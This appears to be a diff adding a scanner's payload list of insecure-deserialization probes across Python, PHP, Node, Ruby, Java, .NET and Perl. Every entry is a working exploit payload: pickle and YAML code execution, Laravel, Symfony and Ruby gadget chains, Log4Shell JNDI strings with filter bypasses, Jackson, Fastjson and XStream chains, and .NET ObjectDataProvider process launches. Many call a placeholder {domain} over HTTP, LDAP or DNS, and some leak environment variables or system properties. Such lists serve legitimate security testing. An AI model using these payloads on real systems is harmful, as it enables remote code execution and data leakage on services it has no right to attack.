@@ -1,0 +1,232 @@
+##Python Pickle P0 - Math (eval 7*191)##
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnNyoxOTEnCnRSLg==
+##Python Pickle P0 - Timing (sleep 5)##
+Y29zCnN5c3RlbQooUydzbGVlcCA1Jwp0Ui4=
+##Python Pickle P0 - OOB urllib##
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGUiKScKdFIu
+##Python Pickle P0 - OOB DNS##
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygic29ja2V0IikuZ2V0YWRkcmluZm8oIntkb21haW59Iiw4MCknCnRSLg==
+##Python Pickle P0 - Error (1/0)##
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnMS8wJwp0Ui4=
+##Python Pickle P0 - Error (bad import)##
+Y19fYnVpbHRpbl9fCl9faW1wb3J0X18KKFMnaW52YWxpZF9tb2R1bGVfMTMzNycKdFIu
+##Python Pickle P0 - Math (subprocess echo 1337)##
+Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CihTJ2VjaG8gMTMzNycKSTAxCnRSLg==
+##Python Pickle P2 - Math (eval 7*191)##
+gAJjX19idWlsdGluX18KZXZhbApxAFgFAAAANyoxOTFxAYVxAlJxAy4=
+##Python Pickle P2 - Timing (sleep 5)##
+gAJjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCA1cQGFcQJScQMu
+##Python Pickle P2 - OOB urllib##
+gAJjX19idWlsdGluX18KZXZhbApxAFhHAAAAX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGUyIilxAYVxAlJxAy4=
+##Python Pickle P2 - Error (1/0)##
+gAJjX19idWlsdGluX18KZXZhbApxAFgDAAAAMS8wcQGFcQJScQMu
+##Python Pickle P4 - Math (eval 7*191)##
+gASVIQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwFNyoxOTGUhZRSlC4=
+##Python Pickle P4 - Timing (sleep 5)##
+gASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA1lIWUUpQu
+##Python Pickle P4 - OOB urllib##
+gASVYwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxHX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGU0IimUhZRSlC4=
+##Python YAML - Math (eval 7*191)##
+!!python/object/apply:builtins.eval ["7*191"]
+##Python YAML - Math (subprocess echo 1337)##
+!!python/object/apply:subprocess.check_output [["echo","1337"]]
+##Python YAML - Timing (sleep 5)##
+!!python/object/apply:os.system ["sleep 5"]
+##Python YAML - OOB urllib##
+!!python/object/apply:builtins.exec ["import urllib.request;urllib.request.urlopen('http://{domain}/yaml')"]
+##Python YAML - OOB DNS##
+!!python/object/apply:builtins.eval ["__import__('socket').getaddrinfo('{domain}',80)"]
+##Python YAML - Error (bad import)##
+!!python/object/apply:builtins.__import__ ['invalid_module_1337']
+##Python YAML - Error (1/0)##
+!!python/object/apply:builtins.eval ["1/0"]
+##Python YAML - OOB exec urllib##
+!!python/object/apply:builtins.exec ["import urllib.request;urllib.request.urlopen('http://{domain}/yaml2')"]
+##Python jsonpickle - Math (eval 7*191)##
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["7*191"]}]}
+##Python jsonpickle - Math (subprocess echo 1337)##
+{"py/reduce":[{"py/function":"subprocess.check_output"},{"py/tuple":[["echo","1337"]]}]}
+##Python jsonpickle - Timing (sleep 5)##
+{"py/reduce":[{"py/function":"time.sleep"},{"py/tuple":[5]}]}
+##Python jsonpickle - Error (1/0)##
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["1/0"]}]}
+##Python jsonpickle - OOB urllib##
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["__import__('urllib.request').request.urlopen('http://{domain}/jsonpickle')"]}]}
+##Python jsonpickle - OOB DNS##
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["__import__('socket').getaddrinfo('{domain}',80)"]}]}
+##PHP Unserialize - Error (nonexistent class)##
+O:9999:"NonExist":0:{}
+##PHP Unserialize - Error (malformed)##
+O:1:"X":0:{
+##PHP Unserialize - Error (bad length)##
+O:8:"stdClass":99:{s:1:"x";s:1:"y";}
+##PHP Unserialize - Error (truncated)##
+O:8:"stdCl
+##PHP Unserialize - Error (nested invalid)##
+a:1:{i:0;O:23:"UndefinedClassName1337":0:{}}
+##PHP Unserialize - Laravel PendingBroadcast##
+O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"\0*\0events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"\0*\0listeners";a:1:{s:8:"shutdown";a:1:{i:0;s:6:"system";}}}s:8:"\0*\0event";s:21:"nslookup {domain}";}
+##PHP Unserialize - Symfony CacheAdapter##
+O:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"\0Symfony\Component\Cache\Adapter\ProxyAdapter\0pool";O:44:"Symfony\Component\Cache\Adapter\ArrayAdapter":3:{s:54:"\0Symfony\Component\Cache\Adapter\ArrayAdapter\0values";a:0:{}s:60:"\0Symfony\Component\Cache\Adapter\ArrayAdapter\0expiration";a:0:{}s:21:"\0*\0createCacheItem";a:2:{i:0;O:15:"Faker\Generator":1:{s:13:"\0*\0formatters";a:1:{s:11:"fetchObject";s:6:"system";}}i:1;s:11:"fetchObject";}}s:58:"\0Symfony\Component\Cache\Adapter\ProxyAdapter\0setInner";s:9:"echo 1337";}
+##Node node-serialize - Math (return 7*191)##
+{"rce":"_$$ND_FUNC$$_function(){return 7*191}()"}
+##Node node-serialize - Timing (sleep 5)##
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep 5')}()"}
+##Node node-serialize - OOB http.get##
+{"rce":"_$$ND_FUNC$$_function(){require('http').get('http://{domain}/nodeser')}()"}
+##Node node-serialize - Math (eval 7*191)##
+{"rce":"_$$ND_FUNC$$_function(){return eval('7*191')}()"}
+##Node node-serialize - Error (throw)##
+{"rce":"_$$ND_FUNC$$_function(){throw new Error('1337')}()"}
+##Node js-yaml - Error (unknown tag)##
+!!invalid_tag_probe 1337
+##Node js-yaml - Error (bad regexp)##
+!!js/regexp /[invalid/
+##Node funcster - Error (invalid code)##
+{"__js":"throw new Error(1337)"}
+##Node cryo - Error (proto pollution)##
+{"__proto__":{"__cryo__":{"reduce":"_$$ND_FUNC$$_function(){throw new Error(1337)}()"}}}
+##Ruby YAML - Error (invalid class)##
+--- !ruby/object:NonExistentClass1337\ni: x
+##Ruby YAML - Error (Gem::Requirement chain)##
+--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Package::TarReader\n  io: &1 !ruby/object:Net::BufferedIO\n    io: &1 !ruby/object:Gem::Package::TarReader::Entry\n       read: 0\n       header: "abc"\n    debug_output: &1 !ruby/object:Net::WriteAdapter\n       socket: &1 !ruby/object:Gem::RequestSet\n           sets: !ruby/object:Net::WriteAdapter\n               socket: !ruby/module 'Kernel'\n               method_id: :system\n           git_set: nslookup {domain}\n       method_id: :resolve
+##Ruby YAML - Error (ERB template)##
+--- !ruby/object:Gem::Requirement\nrequirements: !ruby/object:Gem::DependencyList\n  specs:\n  - !ruby/object:Gem::Source\n    current_fetch_uri: !ruby/object:URI::Generic\n      path: "| nslookup {domain}"
+##Ruby Marshal - Error (invalid class)##
+BAhvOh5Ob25FeGlzdGVudENsYXNzMTMzNwY6BmlJIgZ4BjoGRVQ=
+##Ruby Marshal - Error (ERB template)##
+BAhvOghFUkIHOglAc3JjSSIfPCU9IGBuc2xvb2t1cCB7ZG9tYWlufWAgJT4GOgZFVDoOQGZpbGVuYW1lSSILKGVyYikGOgZFVA==
+##Ruby Marshal - Error (malformed)##
+BAj/AAAA
+##Ruby Marshal - Error (truncated)##
+BAhvOjBBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE=
+##Java JNDI - OOB ldap##
+${jndi:ldap://{domain}/a}
+##Java JNDI - OOB rmi##
+${jndi:rmi://{domain}/a}
+##Java JNDI - OOB iiop##
+${jndi:iiop://{domain}/a}
+##Java JNDI - OOB Log4Shell bypass 1##
+${${lower:j}ndi:${lower:l}dap://{domain}/a}
+##Java JNDI - OOB Log4Shell bypass 2##
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{domain}/a}
+##Java JNDI - OOB Log4Shell bypass 3##
+${j${::-n}di:ldap://{domain}/a}
+##Java JNDI - OOB Log4Shell bypass 4##
+${jn${lower:d}i:ldap://{domain}/a}
+##Java JNDI - OOB Log4Shell bypass 5##
+${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{domain}/a}
+##Java JNDI - OOB env leak##
+${jndi:ldap://{domain}/${env:USER}}
+##Java JNDI - OOB java version leak##
+${jndi:ldap://{domain}/${java:version}}
+##Java JNDI - OOB sys property leak##
+${jndi:ldap://{domain}/${sys:user.dir}}
+##Java Jackson - Error (JdbcRowSetImpl LDAP)##
+["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://{domain}/a","autoCommit":true}]
+##Java Jackson - Error (JdbcRowSetImpl RMI)##
+["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"rmi://{domain}/a","autoCommit":true}]
+##Java Jackson - Error (ClassPathXml)##
+["org.springframework.context.support.ClassPathXmlApplicationContext","http://{domain}/evil.xml"]
+##Java Jackson - Error (TemplatesImpl)##
+["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{"transletBytecodes":["yv66vg=="],"transletName":"a","outputProperties":{}}]
+##Java Jackson - Error (InetAddress DNS)##
+["java.net.InetSocketAddress",{"address":"","port":80,"hostName":"{domain}"}]
+##Java Jackson - Error (C3P0)##
+["com.mchange.v2.c3p0.JndiRefForwardingDataSource",{"jndiName":"ldap://{domain}/a","loginTimeout":0}]
+##Java Jackson - Error (@type JdbcRowSetImpl)##
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{domain}/a","autoCommit":true}
+##Java Jackson - Error (TemplatesImpl @class)##
+{"@class":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","transletBytecodes":["yv66vg=="],"transletName":"a","outputProperties":{}}
+##Java Jackson - Error (XBean JndiConverter)##
+["org.apache.xbean.propertyeditor.JndiConverter",{"asText":"ldap://{domain}/a"}]
+##Java Jackson - Error (Logback)##
+["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://{domain}/a"}]
+##Java Jackson - Error (Spring)##
+["org.springframework.context.support.ClassPathXmlApplicationContext","http://{domain}/jackson.xml"]
+##Java Fastjson - Error (JdbcRowSetImpl)##
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{domain}/a","autoCommit":true}
+##Java Fastjson - Error (TemplatesImpl)##
+{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vg=="],"_name":"a","_tfactory":{},"_outputProperties":{}}
+##Java Fastjson - OOB (InetAddress DNS)##
+{"@type":"java.net.InetAddress","val":"{domain}"}
+##Java Fastjson - OOB (Inet4Address)##
+{"@type":"java.net.Inet4Address","val":"{domain}"}
+##Java Fastjson - Error (L prefix bypass)##
+{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://{domain}/a","autoCommit":true}
+##Java Fastjson - Error (LL bypass)##
+{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://{domain}/a","autoCommit":true}
+##Java Fastjson - Error (1.2.47 cache bypass)##
+{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{domain}/a","autoCommit":true}}
+##Java XStream - Error (ProcessBuilder)##
+<java.lang.ProcessBuilder><command><string>nslookup</string><string>{domain}</string></command></java.lang.ProcessBuilder>
+##Java XStream - Error (EventHandler)##
+<sorted-set><string>foo</string><dynamic-proxy><interface>java.lang.Comparable</interface><handler class="java.beans.EventHandler"><target class="java.lang.ProcessBuilder"><command><string>nslookup</string><string>{domain}</string></command></target><action>start</action></handler></dynamic-proxy></sorted-set>
+##Java XStream - Error (Runtime exec)##
+<object class="java.lang.Runtime" method="getRuntime"><void method="exec"><string>nslookup {domain}</string></void></object>
+##Java XStream - Error (ImageIO/NativeString)##
+<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><contentType>text/plain</contentType><is class="java.io.SequenceInputStream"><e class="javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator"><iterator class="javax.imageio.spi.FilterIterator"><iter class="java.util.ArrayList$Itr"><cursor>0</cursor><lastRet>-1</lastRet><expectedModCount>1</expectedModCount></iter><next class="java.lang.ProcessBuilder"><command><string>nslookup</string><string>{domain}</string></command></next></iterator></e></is></dataSource></dataHandler></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry></map>
+##Java XStream - Error (Spring JNDI)##
+<org.springframework.beans.factory.config.PropertyPathFactoryBean><targetBeanName>ldap://{domain}/a</targetBeanName><propertyPath>a</propertyPath><beanFactory class="org.springframework.jndi.support.SimpleJndiBeanFactory"><shareableResources><string>ldap://{domain}/a</string></shareableResources></beanFactory></org.springframework.beans.factory.config.PropertyPathFactoryBean>
+##SnakeYAML - Error (URLClassLoader OOB)##
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://{domain}/snakeyaml"]]]]
+##SnakeYAML - Error (JdbcRowSetImpl JNDI)##
+!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: "ldap://{domain}/a", autoCommit: true}
+##SnakeYAML - Error (nonexistent class)##
+!!com.nonexistent.FakeClass1337 {}
+##SnakeYAML - Error (C3P0)##
+!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource {userOverridesAsString: "HexAsciiSerializedMap:aced...;", jndiName: "ldap://{domain}/a"}
+##XMLDecoder - Math (echo 1337)##
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>echo 1337</string></void></array><void method="start"/></object></java>
+##XMLDecoder - Timing (sleep 5)##
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.Thread" method="sleep"><long>5000</long></object></java>
+##XMLDecoder - OOB URL.openStream##
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.net.URL"><string>http://{domain}/xmldecoder</string><void method="openStream"/></object></java>
+##XMLDecoder - Error (invalid class)##
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="com.nonexistent.Fake1337"/></java>
+##Java Serialized - Error (HashSet header)##
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==
+##Java Serialized - Error (String array)##
+rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAJ0AAxuc2xvb2t1cCB0ZXN0dAAEdGVzdA==
+##ysoserial URLDNS - OOB (DNS lookup)##
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHA/QAAAAAAADHcIAAAAEAAAAAFzcgAMamF2YS5uZXQuVVJMliU3Nhr85HIDAAdJAAhoYXNoQ29kZUkABHBvcnRMAAlhdXRob3JpdHl0ABJMamF2YS9sYW5nL1N0cmluZztMAARmaWxldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEaG9zdHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHByb3RvY29sdAASTGphdmEvbGFuZy9TdHJpbmc7TAADcmVmdAASTGphdmEvbGFuZy9TdHJpbmc7cP//////////dAAIe2RvbWFpbn10AAcvdXJsZG5zdAAIe2RvbWFpbn10AARodHRwcHh0ABZodHRwOi8ve2RvbWFpbn0vdXJsZG5zeA==
+##Java Hessian - OOB (JNDI ref)##
+C_hessianRldap://{domain}/a
+##.NET Json.NET - OOB (nslookup)##
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"nslookup","Arguments":"{domain}"}}}
+##.NET Json.NET - Math (echo 1337)##
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo 1337"}}}
+##.NET Json.NET - Timing (timeout 5)##
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c timeout 5"}}}
+##.NET Json.NET - OOB (AssemblyInstaller UNC)##
+{"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install","Path":"\\\\{domain}\\share\\evil.dll"}
+##.NET XmlSerializer - OOB (nslookup)##
+<root type="System.Windows.Data.ObjectDataProvider, PresentationFramework"><ObjectInstance type="System.Diagnostics.Process, System"><StartInfo><FileName>nslookup</FileName><Arguments>{domain}</Arguments></StartInfo></ObjectInstance><MethodName>Start</MethodName></root>
+##.NET BinaryFormatter - Error (header probe)##
+AAEAAAD/////AQAAAAAAAAAEAQAAAA==
+##.NET BinaryFormatter - Error (TypeConfuseDelegate)##
+AAEAAAD/////AQAAAAAAAAAEAQAAAD1TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Tb3J0ZWRTZXRgMVtbU3lzdGVtLlN0cmluZw==
+##.NET SoapFormatter - OOB (nslookup)##
+<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><a1:ObjectDataProvider xmlns:a1="http://schemas.microsoft.com/clr/nsassem/System.Windows.Data/PresentationFramework"><MethodName>Start</MethodName><ObjectInstance xsi:type="a2:Process" xmlns:a2="http://schemas.microsoft.com/clr/nsassem/System.Diagnostics/System"><StartInfo><FileName>nslookup</FileName><Arguments>{domain}</Arguments></StartInfo></ObjectInstance></a1:ObjectDataProvider></SOAP-ENV:Body></SOAP-ENV:Envelope>
+##.NET ViewState - Error (probe)##
+__VIEWSTATE=/wEPDwUKLTEyMzQ1Njc4OQ==
+##.NET ViewState - Error (generator)##
+__VIEWSTATEGENERATOR=CA0B0334
+##.NET JavaScriptSerializer - Error (ObjectDataProvider)##
+{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System","StartInfo":{"__type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo 1337"}}}
+##.NET LosFormatter - Error (truncated)##
+/wEAAQAAAP////8BAAAAAAAAAA==
+##.NET ObjectStateFormatter - Error (probe)##
+AAEAAAD/////AQAAAAAAAAAMAQAAABVTeXN0ZW0uV2luZG93cy5Gb3Jtcw==
+##Perl Storable - Error (malformed nfreeze)##
+cHN0MAUKBAAAAAAAAAAA
+##Perl Storable - Error (bad version)##
+cHN0MP///wQA
+##Perl Storable - Error (large length DoS)##
+cHN0MAUKBAP/////
+##Perl YAML - Error (invalid syntax)##
+--- {{{invalid yaml 1337
+##Perl YAML - Error (!!perl/regexp eval)##
+--- !!perl/regexp (?{system("echo 1337")})
+##Perl YAML - Error (!!perl/regexp nested eval)##
+--- !!perl/regexp (?{eval("die 1337")})
